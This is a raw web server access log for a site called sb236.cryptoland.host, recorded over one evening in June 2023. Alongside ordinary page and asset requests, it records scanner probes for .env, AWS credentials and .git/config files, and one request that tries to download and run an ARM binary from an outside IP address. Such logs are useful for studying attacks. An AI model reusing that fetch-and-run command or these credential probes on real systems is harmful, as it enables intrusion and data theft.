144.217.207.28 - - [05/Jun/2023:21:04:44 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
109.237.98.226 - - [05/Jun/2023:21:05:29 -0400] "GET /.env HTTP/1.1" 200 662 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.226 - - [05/Jun/2023:21:05:29 -0400] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.98.226 - - [05/Jun/2023:21:05:30 -0400] "GET /.aws/credentials HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:09:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [05/Jun/2023:21:11:54 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
109.237.97.180 - - [05/Jun/2023:21:14:30 -0400] "GET / HTTP/1.0" 400 362 "-" "-"
109.237.97.180 - - [05/Jun/2023:21:14:31 -0400] "GET /.env HTTP/1.1" 200 662 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [05/Jun/2023:21:14:31 -0400] "GET /.aws/credentials HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:15:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:20:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:25:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [05/Jun/2023:21:27:13 -0400] "GET /geoserver HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:29:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:34:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
184.105.247.195 - - [05/Jun/2023:21:36:41 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
144.217.207.28 - - [05/Jun/2023:21:39:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
184.105.247.195 - - [05/Jun/2023:21:43:18 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0"
172.56.208.59 - - [05/Jun/2023:21:42:24 -0400] "GET / HTTP/2.0" 200 7675 "-" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
172.56.208.59 - - [05/Jun/2023:21:43:26 -0400] "GET /assets/css/plugins/fontawesome.min.css HTTP/2.0" 200 76487 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
172.56.208.59 - - [05/Jun/2023:21:43:26 -0400] "GET /assets/css/style.css HTTP/2.0" 200 155825 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
172.56.208.59 - - [05/Jun/2023:21:43:26 -0400] "GET /assets/css/plugins/slick.css HTTP/2.0" 200 1767 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
172.56.208.59 - - [05/Jun/2023:21:43:26 -0400] "GET /assets/css/plugins/bootstrap.min.css HTTP/2.0" 200 155637 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
172.56.208.59 - - [05/Jun/2023:21:43:33 -0400] "GET /favicon.ico HTTP/2.0" 404 196 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:45:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
184.105.247.195 - - [05/Jun/2023:21:45:41 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
184.105.247.195 - - [05/Jun/2023:21:48:42 -0400] "GET /geoserver/web/ HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0"
192.155.90.220 - - [05/Jun/2023:21:48:49 -0400] "\x16\x03\x01" 400 226 "-" "-"
184.105.247.195 - - [05/Jun/2023:21:49:47 -0400] "GET /.git/config HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
144.217.207.28 - - [05/Jun/2023:21:49:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:54:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:21:59:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:04:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
109.205.213.39 - - [05/Jun/2023:22:06:57 -0400] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 109.205.213.7/bins/UnHAnaAW.arm;chmod+777+/tmp/UnHAnaAW.arm;sh+/tmp/UnHAnaAW.arm" 400 226 "-" "-"
80.66.88.211 - - [05/Jun/2023:22:07:16 -0400] "\x03" 400 226 "-" "-"
144.217.207.28 - - [05/Jun/2023:22:09:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
45.87.9.124 - - [05/Jun/2023:22:14:04 -0400] "GET / HTTP/1.1" 301 238 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
45.87.9.239 - - [05/Jun/2023:22:14:05 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (iPad; CPU OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
144.217.207.28 - - [05/Jun/2023:22:14:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
164.52.36.213 - - [05/Jun/2023:22:19:40 -0400] "\x16\x03\x01\x01 \x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:40 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:40 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:41 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:44 -0400] "\x16\x03\x01\x01 \x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:44 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:44 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:45 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:19:51 -0400] "\x16\x03\x01\x01 \x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:20:05 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:20:05 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:20:06 -0400] "\x16\x03\x01" 400 226 "-" "-"
164.52.36.213 - - [05/Jun/2023:22:20:06 -0400] "GET HTTP/1.1" 400 226 "-" "-"
144.217.207.28 - - [05/Jun/2023:22:19:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
164.52.36.213 - - [05/Jun/2023:22:19:45 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
144.217.207.28 - - [05/Jun/2023:22:25:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:29:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
185.180.143.50 - - [05/Jun/2023:22:33:30 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:34:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:39:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
167.248.133.33 - - [05/Jun/2023:22:41:29 -0400] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.33 - - [05/Jun/2023:22:41:13 -0400] "GET / HTTP/1.1" 200 7324 "-" "-"
167.248.133.33 - - [05/Jun/2023:22:41:14 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
77.239.64.158 - - [05/Jun/2023:22:42:04 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:44:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
172.56.208.211 - - [05/Jun/2023:22:46:36 -0400] "GET / HTTP/2.0" 200 - "-" "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:49:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:22:54:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [05/Jun/2023:22:57:28 -0400] "GET /geoserver HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.243.148.14 - - [05/Jun/2023:22:58:04 -0400] "GET /actuator/health HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
144.217.207.28 - - [05/Jun/2023:22:59:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:04:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
68.183.132.134 - - [05/Jun/2023:23:05:43 -0400] "GET /.git/config HTTP/1.1" 200 282 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:09:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
83.97.73.89 - - [05/Jun/2023:23:11:25 -0400] "GET / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:14:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
20.117.181.251 - - [05/Jun/2023:23:20:33 -0400] "GET /.env HTTP/1.1" 200 662 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:19:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:20:21 -0400] "GET /?DEFAULT_PAGE_TYPE=claim HTTP/2.0" 200 7743 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:21:24 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
20.117.181.251 - - [05/Jun/2023:23:20:33 -0400] "POST / HTTP/1.1" 200 7324 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:24:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:29:40 -0400] "GET / HTTP/2.0" 504 247 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:30:25 -0400] "GET /?DEFAULT_PAGE_TYPE=claim HTTP/2.0" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:30:56 -0400] "GET / HTTP/2.0" 200 65365 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:47 -0400] "GET /assets/css/plugins/fontawesome.min.css HTTP/2.0" 200 76487 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:47 -0400] "GET /assets/css/plugins/bootstrap.min.css HTTP/2.0" 200 155637 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:47 -0400] "GET /assets/css/plugins/slick.css HTTP/2.0" 200 1767 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:47 -0400] "GET /assets/css/style.css HTTP/2.0" 200 155825 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:47 -0400] "GET /assets/js/plugins/jquery-3.6.0.min.js HTTP/2.0" 200 89501 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/css/style.css.map HTTP/2.0" 200 127507 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/img/avatar/avatar_1.png HTTP/2.0" 200 520 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/img/avatar/avatar_3.png HTTP/2.0" 200 520 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/fonts/fa-brands-400.woff2 HTTP/2.0" 200 78460 "https://sb236.cryptoland.host/assets/css/plugins/fontawesome.min.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/js/plugins/isotope.pkg.min.js HTTP/2.0" 200 35456 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:49 -0400] "GET /assets/js/plugins/jquery.slick.min.js HTTP/2.0" 200 42664 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:50 -0400] "GET /assets/js/main.js HTTP/2.0" 200 16826 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:50 -0400] "GET /jeffjs/action.js HTTP/2.0" 200 17327 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:50 -0400] "GET /jeffjs/functions.js HTTP/2.0" 200 9748 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:50 -0400] "GET /jeffjs/filter.js HTTP/2.0" 200 5380 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:52 -0400] "GET /env.js HTTP/2.0" 200 50 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:52 -0400] "GET /assets/img/page_head_bg.svg HTTP/2.0" 200 950 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:31:52 -0400] "POST /jeffajax.php HTTP/2.0" 200 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:32:03 -0400] "POST /jeffajax.php HTTP/2.0" 200 1 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:32:07 -0400] "GET / HTTP/2.0" 200 13740 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:32:09 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:33:06 -0400] "GET / HTTP/2.0" 200 80756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:33:09 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:33:10 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:33:52 -0400] "GET / HTTP/2.0" 200 80756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:33:54 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:33:55 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:34:03 -0400] "GET / HTTP/2.0" 200 80756 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:34:05 -0400] "GET /assets/css/plugins/bootstrap.min.css.map HTTP/2.0" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
188.43.136.46 - - [05/Jun/2023:23:34:07 -0400] "POST /jeffajax.php HTTP/2.0" 200 4117 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:35:40 -0400] "GET / HTTP/2.0" 200 80756 "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:35:42 -0400] "GET /jeffjs/action.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:35:42 -0400] "GET /jeffjs/functions.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
144.217.207.28 - - [05/Jun/2023:23:35:42 -0400] "GET /jeffjs/filter.js HTTP/2.0" 304 - "https://sb236.cryptoland.host/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
